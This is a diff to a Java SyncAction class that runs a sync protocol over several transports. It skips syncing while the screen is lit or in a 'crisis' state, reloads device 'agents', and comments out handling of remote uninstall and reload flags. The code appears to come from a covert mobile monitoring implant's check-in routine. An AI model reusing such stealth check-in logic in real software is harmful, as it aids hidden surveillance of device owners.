@@ -77,23 +77,22 @@ public abstract class SyncAction extends SubAction {
 	public boolean execute() {
 		Check.requires(protocol != null, "execute: null protocol");
 		Check.requires(transports != null, "execute: null transports");
-		
+
 		if (status.synced == true) {
-			Log.d("QZ", TAG + " Warn: " + "Already synced in this action: skipping");
+			Log.d("QZ", TAG + " Warn: "
+					+ "Already synced in this action: skipping");
 			return false;
 		}
 
 		if (status.crisisSync()) {
-			Log.d("QZ", TAG + " Warn: " +"SyncAction - no sync, we are in crisis");
+			Log.d("QZ", TAG + " Warn: "
+					+ "SyncAction - no sync, we are in crisis");
 			return false;
 		}
 
 		if (status.backlight()) {
 			return false;
 		}
-		
-		wantReload = false;
-		wantUninstall = false;
 
 		agentManager.reload(AgentType.AGENT_DEVICE);
 
@@ -103,20 +102,21 @@ public abstract class SyncAction extends SubAction {
 			final Transport transport = (Transport) transports.elementAt(i);
 			Log.d("QZ", TAG + " execute transport: " + transport);
 			Log.d("QZ", TAG + " transport Sync url: " + transport.getUrl());
-			
+
 			if (transport.isAvailable()) {
 				Log.d("QZ", TAG + " execute: transport available");
 				protocol.init(transport);
 
 				try {
 					ret = protocol.perform();
-					wantUninstall = protocol.uninstall;
-					wantReload = protocol.reload;
 				} catch (final ProtocolException e) {
 					Log.d("QZ", TAG + " Error: " + e.toString());
 					ret = false;
 				}
-				
+
+				//wantUninstall = protocol.uninstall;
+				//wantReload = protocol.reload;
+
 			} else {
 				Log.d("QZ", TAG + " execute: transport not available");
 			}
@@ -126,7 +126,7 @@ public abstract class SyncAction extends SubAction {
 				status.synced = true;
 				return true;
 			}
-			
+
 			Log.d("QZ", TAG + " Error: SyncAction Unable to perform");
 		}
 
